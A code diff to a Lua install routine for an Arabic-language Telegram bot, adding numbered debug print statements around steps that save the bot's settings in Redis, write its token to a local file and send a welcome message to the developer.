@@ -91,6 +91,7 @@ GetUser.information = {}
 GetUser.information.id = "750137903";
 print('\n\27[1;36m￤تم آدخآل مـعرف آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERNAME IS_ID: \27[0;32m[750137903]\n\27[0;39;49m')
 boss = Token:match("(%d+)")
+print("1")
 redis:mset(
 boss..":VERSION",GetUser.information.Source_version,
 boss..":SUDO_ID:",GetUser.information.id,
@@ -99,14 +100,20 @@ boss..":UserNameBot:",BOT_User,
 boss..":NameBot:",BOT_NAME,
 "TH3BOSS_INSTALL","Yes"
 )
+print(2)
 redis:hset(boss..'username:'..'swsam','username','@'..'swsam')
+print(3)
 info = {}
 info.username = '@'.. 'swsam'
 info.userbot  = BOT_User
 info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+print("4")
 Cr_file = io.open("./inc/Token.txt", "w")
+print("5")
 Cr_file:write(Token)
+print("6")
 Cr_file:close()
+print("7")
 print('\27[1;36m￤Token.txt is created.\27[m')
 local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id=750137903) \n🔖¦ شكرا لاستخدامك سورس الزعيم \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
 https.request(Api_Token..'/sendMessage?chat_id='..'750137903'..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
